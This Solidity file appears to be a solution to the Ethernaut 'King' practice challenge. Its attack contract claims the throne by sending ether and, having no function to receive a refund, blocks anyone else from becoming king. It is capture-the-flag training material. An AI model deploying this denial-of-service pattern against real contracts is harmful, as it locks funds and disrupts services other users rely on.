//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import{King} from "Ethernaut_King/King.sol";

contract attackContract {
    King target;
    constructor (King _target){
        target = _target;
    }
    function addBalance() public payable {

    }
    function attack() public {
        (bool success,) = payable(target).call{value: 1200000000000000}("");
        require(success);    
        }
}
